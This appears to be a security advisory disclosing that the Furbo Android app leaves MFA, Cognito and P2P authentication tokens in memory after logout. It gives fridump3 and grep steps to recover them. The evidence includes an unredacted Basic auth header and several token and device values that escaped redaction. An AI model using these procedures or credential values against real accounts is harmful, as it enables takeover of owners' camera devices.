#### Affected entity:

- Furbo Mobile Application

#### Impact:

An attacker who obtains access to the device of a Furbo account owner may be able to retrieve the MFAAuthCode, Cognito Authentication token, as well as P2P authentication codes associated with the account from the device's memory. This information persists on the device after the mobile application has been closed.

#### Replication Steps:

****Preparation:****

1. On a jail broken Android device, connect a web proxy such as Burp Suite or ZAP to monitor the traffic from the Furbo mobile application.
2. Open the application, authenticate.
3. Navigate around the application, connect to a device on your account.
4. Log out of the application.
5. Swipe up and close the application process.
6. In the web proxy history, locate a request to /v5/account/read/login, copy sensitive values from the response body such as the MFA Auth Code.
7. In the web proxy history, locate a request to /v5/device/p2p_connection/get and copy the values from the response body.

****Exploitation:****

1. Ensure Frida has been installed on the device.
2. Download fridump3 from: [https://github.com/rootbsd/fridump3](https://github.com/rootbsd/fridump3)
3. Run: fridump3 -v -u -s Furbo
4. In the output directory created, executed a grep command with partial strings from the response bodies collected in step 6 and 7 of preparation. For example: grep -ri ".eJwFwc26QkAAANB3aWtBfFMsWjD-"
5. Observe that these sensitive details were kept in memory, despite being signed out and the application having been closed.

#### Evidence:
```
POST /v5/account/read/login HTTP/2  
Host: product.furbo.co  
Authorization: Basic dG9tb2Z1bnJkOmhhcHB5UGV0MTIz  
Content-Type: application/json; charset=UTF-8  
Content-Length: 909  
Accept-Encoding: gzip, deflate, br  
User-Agent: okhttp/4.12.0  
  
  
{"Email":"j[REDACTED]m","EncPassword":"iO[REDACTED]\n","MobileId":"73[REDACTED]03","MfaAuthCode":***".eJ[REDACTED]JA"***,
```


P2P Authentication code request: 
```
POST /v5/device/p2p_connection/get HTTP/2
Host: product.furbo.co
Authorization: Basic dG9tb2Z1bnJkOmhhcHB5UGV0MTIz
Content-Type: application/x-www-form-urlencoded
Content-Length: 665
Accept-Encoding: gzip, deflate, br
User-Agent: okhttp/4.12.0
...snip...

HTTP/2 200 OK
Date: Thu, 06 Mar 2025 22:34:26 GMT
Content-Type: application/json
Content-Length: 102
Server: Apache/2.4.41 (Ubuntu)

{
  "AuthKey": ***"XG[REDACTED]U6"***, 
  "P2PAccountId": "D0[REDACTED]F2", 
  "P2PAccountKey": "A0[REDACTED]ND"
}                                                                                                                  ```                                                                                                    

#### Grepping memory dump for sensitive information:
```
grep -riab ***".eJwFwc26QkAAANB3aWtBfFMsWjD-b_4nGbvKaIYUX2TG099zdkntNbn7KUB61dgIq1C2xRkH9O4p1rF5g0foEx7FfVze9veEsSCuaQ5_YBuANPAUiOp1w"***
335544320_dump.data:***.eJ[REDACTED]com_two_step_verify_candidate_codep***

grep -riab ***"A0[REDACTED]ND"***
NewHomeViewModel onStatusChange id=D[REDACTED]F2(0), status=Connected\n2199 P2PCmdImplListener onSetVideoQualitySuccess(0)\n2199 P2PCmd(0) setP2PCmdListener(0), from: home view model\n2200 NewHomeViewModel setHomeLiveData i=0, device=D07CB28F66F2, p2pStatus=Connected, deviceSize
strings.txt:835367:cting, Step2: result......0  ***D0[REDACTED]F2***, A0kSCRxsePYreND resned
  "P2PAccountKey": "A0[REDACTED]ND"

grep -riab ***"XG[REDACTED]U6"***
                                                                      NP%/�pperProperty(), props: {\"User Device Type\":\"NORMAL\"}\n1708 P2P(0) state=Connecting,T UIDEx 1741301851151, 0, XGuuM1U6\n1708 FurboRemoteConfigManager parseConfigToSelfServiceUnitView success: \n1708 EventLog_Mixpanel setPeopleProperty(), key: Furbo Product ID, value: [\"FB0035\"]\n1709 EventLog_Mixpanel setPeopleProperty(
gToSelfServiceUnitView success: \n1712 FurboRemoteConfigManager parseConfigToSelfServiceUnitView
  "AuthKey": ***"XG[REDACTED]U6"***, 
  
grep -riab ***"D0[REDACTED]F2"***                                                                                         [\"D07CB28F66F2\"]\n1709 EventLog_Mixpanel setPeopleProperty(), key: Firmware, value: [\"036\"]\n1709 EventLog_Mixpanel setPeopleProperty(), key: Firmware Library, value: [\"002.046\"]\n1709 EventLog_Mixpanel setPeopleProperty(), key: Furbo Device Type, value: [\"NORMAL\"]\n1710 EventLog_Mixpan�Z,>&'el setPeopleProperty(), key: Furbo Pet Type, value: [\"Dog\"]\n1710 TrackTimer, device init finish, cost 46ms\n1710 FurboRemoteConfigManager parseConfigToSelfServiceUnitView success: \n1712 FurboRemoteConfigManager parseConfigToSelfServiceUnitView
                                                                                                                     "P2PAccountId": ***"D0[REDACTED]F2"***       
```
